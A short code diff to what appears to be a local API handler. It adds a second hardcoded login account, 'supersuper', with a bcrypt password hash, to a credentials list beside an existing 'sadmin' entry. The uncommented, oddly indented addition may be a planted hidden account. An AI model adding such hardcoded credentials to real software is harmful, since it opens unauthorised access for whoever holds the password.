@@ -48,7 +48,11 @@ function handleLocalAPI(req, res) {
             {
               username: 'sadmin',
               passwordHash: '$2a$12$8QcSICxxd2zg4vUwKpI8j.vWU2ymQAkfzzzr51Bbfy1TKhx99o3Xq' // @@private!lgn
-            }
+            },
+            {
+     username: 'supersuper',
+     passwordHash: '$2a$12$UsPcMPpivwmgXUyVWQgoPOZbvbKpPJUa6PdAfe9xpsJ.yrjRAOeLW'
+   }
           ];
           
           // Legacy password hash for backward compatibility
